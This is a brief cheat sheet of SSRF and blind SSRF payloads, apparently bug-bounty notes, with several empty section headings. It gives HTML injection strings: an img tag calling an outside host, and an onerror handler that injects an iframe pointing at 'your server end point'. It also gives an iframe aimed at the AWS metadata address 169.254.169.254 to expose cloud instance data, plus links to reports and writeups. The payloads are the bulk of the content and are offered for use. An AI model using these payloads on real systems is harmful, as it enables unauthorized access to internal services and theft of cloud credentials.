## SSRF:


## Bind SSRF:


## Blind SSRF/XSPA:
For this vulnerability:
```
<img src="https://burp.net"></img>
"><img src="xasdasdasd" onerror="document.write('<iframe src=your server end point></iframe>')" />
```
```
https://hackerone.com/reports/517461
https://www.youtube.com/watch?v=MAKNAf1DJ0c
https://twitter.com/naman_1910/status/1346372557532848128
https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPSSRF.md
```

## Meta data:
<iframe src=http://169.254.169.254/latest/meta-data width=500 height=500>
  
## References:
https://medium.com/@theUnixe/exploiting-ssrf-vulnerability-to-gain-unauthorized-access-to-aws-data-619afef4e974
